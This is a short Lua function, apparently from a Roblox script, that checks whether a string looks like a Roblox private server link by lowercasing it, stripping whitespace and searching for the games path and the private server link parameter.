-- ============================================================
-- // VALID PRIV SERVER CHECK
-- // Must contain roblox.com/games/ AND privateServerLinkCode
-- ============================================================
local function isValidPrivServer(link)
    if type(link) ~= "string" then return false end
    local l = link:lower():gsub("%s+", "")
    return l:find("roblox%.com/games/") ~= nil and l:find("privateserverlink") ~= nil
end

